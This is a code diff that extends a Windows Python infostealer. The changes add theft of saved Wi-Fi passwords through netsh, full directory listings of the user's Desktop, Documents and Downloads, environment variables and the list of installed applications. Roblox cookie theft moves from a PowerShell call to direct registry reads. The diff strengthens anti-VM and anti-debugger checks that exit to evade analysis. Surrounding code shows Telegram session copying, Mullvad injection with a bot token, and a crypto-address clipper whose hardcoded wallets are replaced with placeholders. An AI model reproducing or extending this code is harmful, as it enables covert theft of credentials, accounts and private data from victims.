@@ -47,7 +47,10 @@ class ListFonction:
     ClipBoard = list()
     AntiViruses = list()
     Network = list()
+    WifiInfo = list()
+    FileSystemInfo = list()
     SystemInfo = list()
+    ApplicationsInfo = list()
     DiscordAccounts = list()
     FacebookAccounts = list()
     RobloxAccounts = list()
@@ -661,7 +664,7 @@ class get_data:
                     logs_handler(f"get tiktok subs error - {str(e)}")
                     subscriber = "0"
 
-                formatted_date = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))
+                formatted_date = datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')
 
         except Exception as e:
             logs_handler(f"tiktok session error - {str(e)}")
@@ -1352,15 +1355,14 @@ async def CryptoClipper() -> None:
 
             # the clipper is not working (i'm working on it)
             blockchains = [
-                ("bc1qg76lq8455ugfmpse8fmdpcktq6v2c2ljnv6ra3", re.compile(r"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{{25,39}}$")),  # BTC
-                ("LUYUXLnCk2Jp3xYZsqdkNoZ8Ujhohr15vs", re.compile(r"^(L|M|3)[a-km-zA-HJ-NP-Z1-9]{{26,33}}$")),  # LTC
-                ("GAHEXTWXOEICVZPWIUFRUSJUNO6PBP2RLTHUBZIXVRBBSWPQ4E4OAGJI", re.compile(r"^G[0-9a-zA-Z]{{55}}$")),  # Stellar
-                ("r4D1EJW22VQm5fz6ZAFmWmWt6ppcx1t3z8", re.compile(r"^r[0-9a-zA-Z]{{24,34}}$")),  # Ripple
-                ("qqx7kkasdedvmp7q2nrd33y97y3u256kqvh0mvmtdr", re.compile(r"^(bitcoincash:)?(q|p)[a-z0-9]{{41}}$")),  # BCH
-                ("0x44E1f6Aad473F85a3b7970A0E1df08d662CE8D3F", re.compile(r"^0x[a-fA-F0-9]{{40}}$")),  # ETH
+                ("BTC_ADDRESS", re.compile(r"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{{25,39}}$")),  # BTC
+                ("LTC_ADDRESS", re.compile(r"^(L|M|3)[a-km-zA-HJ-NP-Z1-9]{{26,33}}$")),  # LTC
+                ("STELLAR_ADDRESS", re.compile(r"^G[0-9a-zA-Z]{{55}}$")),  # Stellar
+                ("RIPPLE_ADDRESS", re.compile(r"^r[0-9a-zA-Z]{{24,34}}$")),  # Ripple
+                ("BCH_ADDRESS", re.compile(r"^(bitcoincash:)?(q|p)[a-z0-9]{{41}}$")),  # BCH
+                ("ETH_ADDRESS", re.compile(r"^0x[a-fA-F0-9]{{40}}$")),  # ETH
                 ("NEO_ADDRESS", re.compile(r"^A[0-9a-zA-Z]{{33}}$")),  # NEO
-                ("XyN3rN7nWsmqzNR7imYh7poKN1se1g3kxm", re.compile(r"^X[1-9A-HJ-NP-Za-km-z]{{33}}$")),  # NeoGas
-                ("D5x5um1hUJoDuEPhVVf54Uc6uTL4wdKVHr", re.compile(r"^D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{{32}}$"))  # Dash
+                ("DASH_ADDRESS", re.compile(r"^D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{{32}}$"))  # Dash
             ]
 
             while True:
@@ -1497,7 +1499,8 @@ asyncio.run(main())
         if Path(mullvad_license_path).exists():
             with open(mullvad_license_path, 'w') as license_file:
                 license_file.write(f"{TOKEN}\n{CHAT_ID}")
-        else:pass
+        else:
+            pass
 
         await inject(mullvad_path, mullvad_asar_path, mullvad_injection_url, mullvad_license_path)
 
@@ -1509,7 +1512,6 @@ asyncio.run(main())
             if os.path.exists(tg_path):
                 copy_path = os.path.join(directory_path, "Messenger", "Telegram Session")
                 black_listed_dirs = ["dumps", "emojis", "user_data", "working", "emoji", "tdummy", "user_data#2", "user_data#3", "user_data#4", "user_data#5"]
-
                 processes = await asyncio.create_subprocess_shell(f"taskkill /F /IM Telegram.exe", shell=True, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
                 await processes.communicate()
 
@@ -2280,14 +2282,25 @@ asyncio.run(main())
     async def StealRoblox(self, browsercookies, browser) -> None:
         async def StealCookie():
             try:
-                def subproc(path):
-                    cmd = f'powershell Get-ItemPropertyValue -Path {path}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY'
-                    try:
-                        return subprocess.check_output(cmd, shell=True, text=True).strip()
-                    except subprocess.CalledProcessError:
-                        return None
+                def get_roblox_cookie_from_registry():
+                    paths = [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]
+                    sub_key = "SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com"
+                    cookie_name = ".ROBLOSECURITY"
 
-                regex_cookie = subproc("HKLM") or subproc("HKCU")
+                    for path in paths:
+                        try:
+                            registry_key = winreg.OpenKey(path, sub_key, 0, winreg.KEY_READ)
+                            cookie, _ = winreg.QueryValueEx(registry_key, cookie_name)
+                            winreg.CloseKey(registry_key)
+                            return cookie
+                        except FileNotFoundError:
+                            continue
+                        except Exception as e:
+                            logs_handler(f"Error retrieving cookie from registry: {e}")
+                            continue
+                    return None
+
+                regex_cookie = get_roblox_cookie_from_registry()
                 return regex_cookie if regex_cookie else None
 
             except Exception as Error:
@@ -2441,10 +2454,8 @@ asyncio.run(main())
             return
 
         try:
-
             battle_path = os.path.join(directory_path, "Games", "Battle Net")
             os.makedirs(battle_path, exist_ok=True)
-
             for pattern in ["*.db", "*.config"]:
                 for root, dirs, files in os.walk(battle_net_path):
                     for file in files:
@@ -2457,23 +2468,18 @@ asyncio.run(main())
                                     destination_dir = os.path.join(directory_path, os.path.basename(root))
 
                                 os.makedirs(destination_dir, exist_ok=True)
-
                                 shutil.copy(file_path, os.path.join(battle_path, file))
                             except Exception as Error:
                                 logs_handler(f"[ERROR] - copying BattleNet files to logs: {str(Error)}")
                                 return
-
-
         except Exception as Error:
             logs_handler(f"[ERROR] - getting BattleNet files: {str(Error)}")
             pass
-
 
     async def StealShadow(self, directory_path: str) -> None:
         try:
             shadow_path = os.path.join(self.appdata, 'shadow')
             copied_path = os.path.join(directory_path, "Games", "Shadow")
-            
             if os.path.isdir(shadow_path):
                 if not os.path.exists(copied_path):
                     os.makedirs(copied_path)
@@ -2508,7 +2514,6 @@ asyncio.run(main())
     async def InsideFolder(self) -> None:
         try:
             hostname = platform.node()
-
             filePath = os.path.join(self.temp, hostname)
 
             if os.path.isdir(filePath):
@@ -2556,8 +2561,18 @@ asyncio.run(main())
                 with open(os.path.join(filePath, "Computer", "anti_viruses.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     for value in ListFonction.AntiViruses:
                         file.write(value)
-
-
+            if ListFonction.FileSystemInfo:
+                with open(os.path.join(filePath, "Computer", "file_system.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    for value in ListFonction.FileSystemInfo:
+                        file.write(value)
+            if ListFonction.ApplicationsInfo:
+                with open(os.path.join(filePath, "Computer", "application_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    for value in ListFonction.ApplicationsInfo:
+                        file.write(value)
+            if ListFonction.WifiInfo:
+                with open(os.path.join(filePath, "Computer", "wifi_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    for value in ListFonction.WifiInfo:
+                        file.write(value)
 
             if ListFonction.SteamUserAccounts:
                 with open(os.path.join(filePath, "Sessions", "steam_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
@@ -2963,7 +2978,11 @@ class InfoStealer:
         await asyncio.gather(
             self.StealLastClipBoard(),
             self.StealNetworkInformation(),
-            self.StealSystemInfo()
+            self.StealSystemInfo(),
+            self.StealFileSystemInfo(),
+            self.StealAntiViruses(),
+            self.StealApplicationsInfo(),
+            self.StealWifiInfo(),
         )
     
     async def get_command_output(self, command: str) -> str:
@@ -2977,7 +2996,7 @@ class InfoStealer:
         try:
             output = await self.get_command_output("powershell.exe Get-Clipboard")
             if output:
-                ListFonction.ClipBoard.append(output)
+                ListFonction.ClipBoard.append(f"{output}")
         except Exception as Error:
             logs_handler(f"[ERROR] - getting clipboard informations: {str(Error)}")
 
@@ -2996,30 +3015,245 @@ class InfoStealer:
             logs_handler(f"[ERROR] - getting network informations: {str(Error)}")
 
     async def StealSystemInfo(self) -> None:
+        system_info = {}
+
+        def get_os_info():
+            try:
+                return {
+                    "System": platform.system(),
+                    "Node Name": platform.node(),
+                    "Release": platform.release(),
+                    "Version": platform.version(),
+                    "Machine": platform.machine(),
+                    "Processor": platform.processor()
+                }
+            except Exception as e:
+                return {"OS Info": f"Error retrieving OS info: {str(e)}"}
+
+        def get_cpu_info():
+            try:
+                return {
+                    "Physical Cores": psutil.cpu_count(logical=False),
+                    "Total Cores": psutil.cpu_count(logical=True),
+                    "Max Frequency": f"{psutil.cpu_freq().max}Mhz",
+                    "Min Frequency": f"{psutil.cpu_freq().min}Mhz",
+                    "Current Frequency": f"{psutil.cpu_freq().current}Mhz",
+                    "CPU Usage": f"{psutil.cpu_percent()}%"
+                }
+            except Exception as e:
+                return {"CPU Info": f"Error retrieving CPU info: {str(e)}"}
+
+        def get_memory_info():
+            try:
+                virtual_memory = psutil.virtual_memory()
+                swap_memory = psutil.swap_memory()
+                return {
+                    "Total RAM": f"{virtual_memory.total // (1024 ** 2)} MB",
+                    "Available RAM": f"{virtual_memory.available // (1024 ** 2)} MB",
+                    "Used RAM": f"{virtual_memory.used // (1024 ** 2)} MB",
+                    "Total Swap": f"{swap_memory.total // (1024 ** 2)} MB",
+                    "Used Swap": f"{swap_memory.used // (1024 ** 2)} MB",
+                }
+            except Exception as e:
+                return {"Memory Info": f"Error retrieving memory info: {str(e)}"}
+
+        def get_disk_info():
+            disk_info = {}
+            try:
+                for partition in psutil.disk_partitions():
+                    usage = psutil.disk_usage(partition.mountpoint)
+                    disk_info[partition.device] = {
+                        "Mountpoint": partition.mountpoint,
+                        "Filesystem": partition.fstype,
+                        "Total Size": f"{usage.total // (1024 ** 3)} GB",
+                        "Used": f"{usage.used // (1024 ** 3)} GB",
+                        "Free": f"{usage.free // (1024 ** 3)} GB",
+                        "Percentage Used": f"{usage.percent}%"
+                    }
+                return disk_info
+            except Exception as e:
+                return {"Disk Info": f"Error retrieving disk info: {str(e)}"}
+
+        def get_environment_variables():
+            try:
+                return dict(os.environ)
+            except Exception as e:
+                return {"Environment Variables": f"Error retrieving environment variables: {str(e)}"}
+
+        def get_registry_info():
+            registry_data = {}
+            try:
+                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion") as key:
+                    registry_data["Product Name"] = winreg.QueryValueEx(key, "ProductName")[0]
+                    registry_data["Release ID"] = winreg.QueryValueEx(key, "ReleaseId")[0]
+                    registry_data["Build Number"] = winreg.QueryValueEx(key, "CurrentBuild")[0]
+                    registry_data["Edition ID"] = winreg.QueryValueEx(key, "EditionID")[0]
+                return registry_data
+            except Exception as e:
+                return {"Registry Info": f"Error retrieving registry info: {str(e)}"}
+
         try:
-            command = r'echo ####System Info#### & systeminfo & echo ####System Version#### & ver & echo ####Host Name#### & hostname & echo ####Environment Variable#### & set & echo ####Logical Disk#### & wmic logicaldisk get caption,description,providername'
-            output = await self.get_command_output(command)
-            ListFonction.SystemInfo.append(output)
+            system_info["OS Info"] = get_os_info()
+            system_info["CPU Info"] = get_cpu_info()
+            system_info["Memory Info"] = get_memory_info()
+            system_info["Disk Info"] = get_disk_info()
+            system_info["Environment Variables"] = get_environment_variables()
+            system_info["Registry Info"] = get_registry_info()
+
+            ListFonction.SystemInfo.append(f"{system_info}")
         except Exception as Error:
-            logs_handler(f"[ERROR] - getting system informations: {str(Error)}")
-            pass
+            logs_handler(f"[ERROR] - getting system information: {str(Error)}")
+
+    async def StealFileSystemInfo(self) -> None:
+        filesystem_info = {
+            "Directories": {},
+            "Disks": []
+        }
+
+        directories = {
+            "Desktop": os.path.join(os.path.expanduser("~"), "Desktop"),
+            "Documents": os.path.join(os.path.expanduser("~"), "Documents"),
+            "Downloads": os.path.join(os.path.expanduser("~"), "Downloads"),
+            "Pictures": os.path.join(os.path.expanduser("~"), "Pictures"),
+            "Videos": os.path.join(os.path.expanduser("~"), "Videos"),
+            "Home": os.path.expanduser("~")
+        }
+
+        def get_directory_files(dir_path):
+            try:
+                file_list = []
+                folder_list = []
+                for root, dirs, files in os.walk(dir_path):
+                    for folder in dirs:
+                        folder_list.append(os.path.join(root, folder))
+                    for file in files:
+                        file_list.append(os.path.join(root, file))
+                return {"Folders": folder_list, "Files": file_list}
+            except Exception as e:
+                return {"Error": f"Failed to scan directory {dir_path}: {str(e)}"}
+
+        def get_disk_letters():
+            disk_letters = []
+            for letter in string.ascii_uppercase:
+                if os.path.exists(f"{letter}:\\"):
+                    disk_letters.append(f"{letter}:\\")
+            return disk_letters
+
+        try:
+            for name, path in directories.items():
+                filesystem_info["Directories"][name] = get_directory_files(path)
+            
+            filesystem_info["Disks"] = get_disk_letters()
+
+            ListFonction.FileSystemInfo.append(f"{filesystem_info}")
+        except Exception as Error:
+            logs_handler(f"[ERROR] - getting filesystem information: {str(Error)}")
 
     async def StealAntiViruses(self) -> None:
-        encoded_script = "CgBmAHUAbgBjAHQAaQBvAG4AIABHAGUAdAAtAEEAbgB0AGkAVgBpAHIAdQBzAFAAcgBvAGQAdQBjAHQAIAB7AAoAIAAgACAAIABbAEMAbQBkAGwAZQB0AEIAaQBuAGQAaQBuAGcAKAApAF0ACgAgACAAIAAgAHAAYQByAGEAbQAgACgACgAgACAAIAAgACAAIAAgACAAWwBBAGwAaQBhAHMAKAAnAG4AYQBtAGUAJwApAF0ACgAgACAAIAAgACAAIAAgACAAJABjAG8AbQBwAHUAdABlAHIAbgBhAG0AZQA9ACQAZQBuAHYAOgBjAG8AbQBwAHUAdABlAHIAbgBhAG0AZQAKACAAIAAgACAAKQAKAAoAIAAgACAAIAAkAEEAbgB0AGkAVgBpAHIAdQBzAFAAcgBvAGQAdQBjAHQAcwAgAD0AIABHAGUAdAAtAFcAbQBpAE8AYgBqAGUAYwB0ACAALQBOAGEAbQBlAHMAcABhAGMAZQAgACIAcgBvAG8AdABcAFMAZQBjAHUAcgBpAHQAeQBDAGUAbgB0AGUAcgAyACIAIAAtAEMAbABhAHMAcwAgAEEAbgB0AGkAVgBpAHIAdQBzAFAAcgBvAGQAdQBjAHQAIAAtAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACAAJABjAG8AbQBwAHUAdABlAHIAbgBhAG0AZQAKACAAIAAgACAAJAByAGUAdAAgAD0AIABAACgAKQAKACAAIAAgACAACgAgACAAIAAgAGYAbwByAGUAYQBjAGgAIAAoACQAQQBuAHQAaQBWAGkAcgB1AHMAUAByAG8AZAB1AGMAdAAgAGkAbgAgACQAQQBuAHQAaQBWAGkAcgB1AHMAUAByAG8AZAB1AGMAdABzACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACQAZABlAGYAcwB0AGEAdAB1AHMAIAA9ACAAIgBVAG4AawBuAG8AdwBuACIACgAgACAAIAAgACAAIAAgACAAJAByAHQAcwB0AGEAdAB1AHMAIAA9ACAAIgBVAG4AawBuAG8AdwBuACIACgAgACAAIAAgACAAIAAgACAACgAgACAAIAAgACAAIAAgACAAcwB3AGkAdABjAGgAIAAoACQAQQBuAHQAaQBWAGkAcgB1AHMAUAByAG8AZAB1AGMAdAAuAHAAcgBvAGQAdQBjAHQAUwB0AGEAdABlACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIgAyADYAMgAxADQANAAiACAAewAgACQAZABlAGYAcwB0AGEAdAB1AHMAIAA9ACAAIgBVAHAAIAB0AG8AIABkAGEAdABlACIAOwAgACQAcgB0AHMAdABhAHQAdQBzACAAPQAgACIARABpAHMAYQBiAGwAZQBkACIAIAB9AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIgAyADYANgAyADQAMAAiACAAewAgACQAZABlAGYAcwB0AGEAdAB1AHMAIAA9ACAAIgBVAHAAIAB0AG8AIABkAGEAdABlACIAOwAgACQAcgB0AHMAdABhAHQAdQBzACAAPQAgACIARQBuAGEAYgBsAGUAZAAiACAAfQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACIAMwA5ADMAMgAxADYAIgAgAHsAIAAkAGQAZQBmAHMAdABhAHQAdQBzACAAPQAgACIAVQBwACAAdABvACAAZABhAHQAZQAiADsAIAAkAHIAdABzAHQAYQB0AHUAcwAgAD0AIAAiAEQAaQBzAGEAYgBsAGUAZAAiACAAfQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACIAMwA5ADcAMwAxADIAIgAgAHsAIAAkAGQAZQBmAHMAdABhAHQAdQBzACAAPQAgACIAVQBwACAAdABvACAAZABhAHQAZQAiADsAIAAkAHIAdABzAHQAYQB0AHUAcwAgAD0AIAAiAEUAbgBhAGIAbABlAGQAIgAgAH0ACgAgACAAIAAgACAAIAAgACAAfQAKAAoAIAAgACAAIAAgACAAIAAgACQAaAB0ACAAPQAgAFsAUABTAEMAdQBzAHQAbwBtAE8AYgBqAGUAYwB0AF0AQAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQwBvAG0AcAB1AHQAZQByAG4AYQBtAGUAIAA9ACAAJABjAG8AbQBwAHUAdABlAHIAbgBhAG0AZQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE4AYQBtAGUAIAA9ACAAJABBAG4AdABpAFYAaQByAHUAcwBQAHIAbwBkAHUAYwB0AC4AZABpAHMAcABsAGEAeQBOAGEAbQBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJwBQAHIAbwBkAHUAYwB0ACAARwBVAEkARAAnACAAPQAgACQAQQBuAHQAaQBWAGkAcgB1AHMAUAByAG8AZAB1B1AGMAdAAuAGkAbgBzAHQAYQBuAGMAZQBHAHUAaQBkAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJwBQAHIAbwBkAHUAYwB0ACAARQB4AGUAYwB1AHQAYQBiAGwAZQAnACAAPQAgACQAQQBuAHQAaQBWAGkAcgB1AHMAUAByAG8AZAB1AGMAdAAuAHAAYQB0AGgAVABvAFMAaQBnAG4AZQBkAFAAcgBvAGQAdQBjAHQARQB4AGUACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAnAFIAZQBwAG8AcgB0AGkAbgBnACAARQB4AGUAJwAgAD0AIAAkAEEAbgB0AGkAVgBpAHIAdQBzAFAAcgBvAGQAdQBjAHQALgBwAGEAdABoAFQAbwBTAGkAZwBuAGUAZABSAGUAcABvAHIAdABpAG4AZwBFAHgAZQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACcARABlAGYAaQBuAGkAdABpAG8AbgAgAFMAdABhAHQAdQBzACcAIAA9ACAAJABkAGUAZgBzAHQAYQB0AHUAcwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACcAUgBlAGEAbAAtAHQAaQBtAGUAIABQAHIAbwB0AGUAYwB0AGkAbwBuACAAUwB0AGEAdAB1AHMAJwAgAD0AIAAkAHIAdABzAHQAYQB0AHUAcwAKACAAIAAgACAAIAAgACAAIAB9AAoAIAAgACAAIAAgACAAIAAgACQAcgBlAHQAIAArAD0AIAAkAGgAdAAKACAAIAAgACAAfQAKACAAIAAgACAAUgBlAHQAdQByAG4AIAAkAHIAZQB0AAoAfQAKAEcAZQB0AC0AQQBuAHQAaQBWAGkAcgB1AHMAUAByAG8AZAB1AGMAdAAKAA=="
-        command = f"powershell -EncodedCommand {encoded_script}"
-        try:
-            process = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
-            stdout, stderr = await process.communicate()
-            if process.returncode == 0:
-                antivirus_info = stdout.decode().strip()
-                ListFonction.AntiViruses.append(antivirus_info)
-            else:
-                pass
-        except Exception as e:
-            logs_handler(f"Error getting antivirus information: {str(e)}")
+        antivirus_names = []
 
-class anti_vm:
-    async def run_all_fonctions(self) -> None:
+        paths = [
+            r"SOFTWARE\Microsoft\Security Center\Provider",
+            r"SOFTWARE\Microsoft\Windows Defender"
+        ]
+        
+        def get_antivirus_names_from_registry():
+            for path in paths:
+                try:
+                    registry_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
+                    for i in range(winreg.QueryInfoKey(registry_key)[0]):
+                        try:
+                            subkey_name = winreg.EnumKey(registry_key, i)
+                            subkey = winreg.OpenKey(registry_key, subkey_name)
+                            try:
+                                name, _ = winreg.QueryValueEx(subkey, "DisplayName")
+                                antivirus_names.append(name)
+                            except FileNotFoundError:
+                                continue
+                        except Exception:
+                            continue
+                except Exception as e:
+                    continue
+            return antivirus_names
+        try:
+            found_antiviruses = get_antivirus_names_from_registry()
+            if found_antiviruses:
+                for name in found_antiviruses:
+                    ListFonction.AntiViruses.append(f"{name}")
+        except Exception as e:
+            logs_handler(f"Error retrieving antivirus information: {e}")
+
+    async def StealApplicationsInfo(self) -> None:
+        applications_info = {
+            "Installed Applications": [],
+            "Deleted Applications": []
+        }
+
+        installed_paths = [
+            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
+            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
+        ]
+
+        def get_application_names_from_registry(paths):
+            application_names = []
+            for path in paths:
+                try:
+                    registry_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
+                    for i in range(winreg.QueryInfoKey(registry_key)[0]):
+                        try:
+                            subkey_name = winreg.EnumKey(registry_key, i)
+                            subkey = winreg.OpenKey(registry_key, subkey_name)
+                            
+                            try:
+                                app_name, _ = winreg.QueryValueEx(subkey, "DisplayName")
+                                application_names.append(app_name)
+                            except FileNotFoundError:
+                                continue
+                        except Exception:
+                            continue
+                except Exception:
+                    continue
+            return application_names
+
+        try:
+            applications_info["Installed Applications"] = get_application_names_from_registry(installed_paths)
+
+            ListFonction.ApplicationsInfo.append(f"{applications_info}")
+        except Exception as Error:
+            logs_handler(f"[ERROR] - getting applications information: {str(Error)}")
+
+    async def StealWifiInfo(self) -> None:
+        wifi_info = []
+
+        def get_wifi_profiles():
+            try:
+                profiles_output = subprocess.check_output("netsh wlan show profiles", shell=True, text=True)
+                profiles = re.findall(r"All User Profile\s*: (.+)", profiles_output)
+                return profiles
+            except Exception as e:
+                logs_handler(f"Error retrieving Wi-Fi profiles: {str(e)}")
+                return []
+
+        def get_wifi_password(profile):
+            try:
+                password_output = subprocess.check_output(f"netsh wlan show profile \"{profile}\" key=clear", shell=True, text=True)
+                password = re.search(r"Key Content\s*: (.+)", password_output)
+                return password.group(1) if password else "No password found"
+            except Exception as e:
+                logs_handler(f"Error retrieving password for {profile}: {str(e)}")
+                return "Error retrieving password"
+
+        profiles = get_wifi_profiles()
+        for profile in profiles:
+            wifi_info.append({
+                "SSID": profile,
+                "Password": get_wifi_password(profile)
+            })
+
+        ListFonction.WifiInfo.extend(f"{wifi_info}")
+
+class AntiVM:
+    async def run_all_functions(self) -> None:
         tasks = [
             asyncio.create_task(self.check_disk_space()),
             asyncio.create_task(self.check_recent_files()),
@@ -3027,28 +3261,26 @@ class anti_vm:
             asyncio.create_task(self.check_virtual_memory()),
             asyncio.create_task(self.check_for_virtualization()),
             asyncio.create_task(self.check_for_suspicious_files()),
-            asyncio.create_task(self.check_system_manufacturer())
+            asyncio.create_task(self.check_system_manufacturer()),
+            asyncio.create_task(self.check_antivirus_processes())
         ]
         try:
             await asyncio.gather(*tasks)
         except Exception as Error:
-            logs_handler(f"[ERROR] - run all anti_vm fonctions: {str(Error)}")
+            logs_handler(f"[ERROR] - run all anti_vm functions: {str(Error)}")
 
-    async def check_disk_space(self) -> bool:
+    async def check_disk_space(self) -> None:
         try:
             total_disk_space_gb = sum(psutil.disk_usage(drive.mountpoint).total for drive in psutil.disk_partitions()) / (1024 ** 3)
-            if total_disk_space_gb < 50:
+            if total_disk_space_gb < 100:
                 ctypes.windll.kernel32.ExitProcess(0)
-            min_disk_space_gb = 50
-            if len(sys.argv) > 1:
-                min_disk_space_gb = float(sys.argv[1])
             free_space_gb = win32api.GetDiskFreeSpaceEx()[1] / 1073741824
-            if free_space_gb < min_disk_space_gb:
+            if free_space_gb < 20:
                 ctypes.windll.kernel32.ExitProcess(0)
         except Exception as Error:
             logs_handler(f"[ERROR] - suspicious disk space detected: {str(Error)}")
 
-    async def check_recent_files(self) -> bool:
+    async def check_recent_files(self) -> None:
         try:
             recent_files_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Recent')
             if len(os.listdir(recent_files_folder)) < 20:
@@ -3058,69 +3290,81 @@ class anti_vm:
 
     async def check_process_count(self) -> None:
         try:
-            if len(psutil.pids()) < 50:
+            if len(psutil.pids()) < 75:
                 ctypes.windll.kernel32.ExitProcess(0)
         except Exception as Error:
-            logs_handler(f"[ERROR] - suspicious process detected: {str(Error)}")
+            logs_handler(f"[ERROR] - suspicious process count detected: {str(Error)}")
 
     async def check_virtual_memory(self) -> None:
         try:
             total_memory_gb = psutil.virtual_memory().total / (1024 ** 3)
-            if total_memory_gb < 6:
+            if total_memory_gb < 8:
                 ctypes.windll.kernel32.ExitProcess(0)
         except Exception as Error:
-            logs_handler(f"[ERROR] - virtual memory detected: {str(Error)}")
+            logs_handler(f"[ERROR] - suspicious virtual memory detected: {str(Error)}")
 
     async def check_for_virtualization(self) -> None:
         try:
-            process = await asyncio.create_subprocess_shell('wmic path win32_VideoController get name',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,shell=True)
+            process = await asyncio.create_subprocess_shell('wmic path win32_VideoController get name', stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
             stdout, stderr = await process.communicate()
             video_controller_info = stdout.decode(errors='ignore').splitlines()
-            if any(x.lower() in video_controller_info[2].strip().lower() for x in ("virtualbox", "vmware")):
+            if any(keyword in video_controller_info[2].lower() for keyword in ["virtualbox", "vmware", "qemu", "xen"]):
                 ctypes.windll.kernel32.ExitProcess(0)
         except Exception as Error:
             logs_handler(f"[ERROR] - virtual machine detected: {str(Error)}")
 
     async def check_for_suspicious_files(self) -> None:
         try:
-            temp_file_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Temp', 'JSAMSIProvider64.dll')
-            if os.path.exists(temp_file_path):
-                ctypes.windll.kernel32.ExitProcess(0)
-            try:
-                machine_name = platform.uname().machine.lower()
-                if "dady harddisk" in machine_name or "qemu harddisk" in machine_name:
+            vm_files = [
+                os.path.join(os.getenv('LOCALAPPDATA'), 'Temp', 'VMDetectionFile.dll'),
+                os.path.join(os.getenv('PROGRAMFILES'), 'VMware', 'VMware Tools'),
+                os.path.join(os.getenv('SYSTEMROOT'), 'System32', 'drivers', 'vmmouse.sys'),
+                os.path.join(os.getenv('SYSTEMROOT'), 'System32', 'drivers', 'vmhgfs.sys')
+            ]
+            for file_path in vm_files:
+                if os.path.exists(file_path):
                     ctypes.windll.kernel32.ExitProcess(0)
-            except AttributeError:
-                pass
+
 
             suspicious_process_names = ["32dbg", "64dbgx", "autoruns", "autoruns64", "autorunsc", "autorunsc64", "ciscodump", "df5serv", "die", "dumpcap", "efsdump", "etwdump", "fakenet", "fiddler", "filemon", "hookexplorer", "httpdebugger", "httpdebuggerui", "ida", "ida64", "idag", "idag64", "idaq", "idaq64", "idau", "idau64", "idaw", "immunitydebugger", "importrec", "joeboxcontrol", "joeboxserver", "ksdumperclient", "lordpe", "ollydbg", "pestudio", "petools", "portmon", "prl_cc", "prl_tools", "proc_analyzer", "processhacker", "procexp", "procexp64", "procmon", "procmon64", "qemu-ga", "qga", "regmon", "reshacker", "resourcehacker", "sandman", "sbiesvc", "scylla", "scylla_x64", "scylla_x86", "sniff_hit", "sysanalyzer", "sysinspector", "sysmon", "tcpdump", "tcpview", "tcpview64", "udpdump", "vboxcontrol", "vboxservice", "vboxtray", "vgauthservice", "vm3dservice", "vmacthlp", "vmsrvc", "vmtoolsd", "vmusrvc", "vmwaretray", "vmwareuser", "vt-windows-event-stream", "windbg", "wireshark", "x32dbg", "x64dbg", "x96dbg", "xenservice"]
           
-            running_processes = [
-                process.name().lower() for process in psutil.process_iter(attrs=['name']) 
-                if process.name().lower() in suspicious_process_names
-            ]
-            if running_processes:
-                ctypes.windll.kernel32.ExitProcess(0)
+            for proc in psutil.process_iter(attrs=['name']):
+                if proc.info['name'].lower() in suspicious_process_names:
+                    ctypes.windll.kernel32.ExitProcess(0)
         except Exception as Error:
-            logs_handler(f"[ERROR] suspicious files detected: {str(Error)}")
+            logs_handler(f"[ERROR] - suspicious files or processes detected: {str(Error)}")
 
     async def check_system_manufacturer(self) -> None:
         try:
-            process1 = await asyncio.create_subprocess_shell('wmic computersystem get Manufacturer',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,shell=True)
-            stdout1, stderr1 = await process1.communicate()
-
-            process2 = await asyncio.create_subprocess_shell('wmic path Win32_ComputerSystem get Manufacturer',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,shell=True)
-            stdout2, stderr2 = await process2.communicate()
-
-            if b'VMware' in stdout1 or b"vmware" in stdout2.lower():
-                ctypes.windll.kernel32.ExitProcess(0)
+            manufacturer_check_cmds = [
+                'wmic computersystem get Manufacturer',
+                'wmic baseboard get Manufacturer'
+            ]
+            for cmd in manufacturer_check_cmds:
+                process = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
+                stdout, stderr = await process.communicate()
+                if any(keyword in stdout.decode().lower() for keyword in ["vmware", "virtualbox", "qemu", "xen"]):
+                    ctypes.windll.kernel32.ExitProcess(0)
         except Exception as Error:
-            logs_handler(f"[ERROR] - vm manufacturer detected: {str(Error)}")
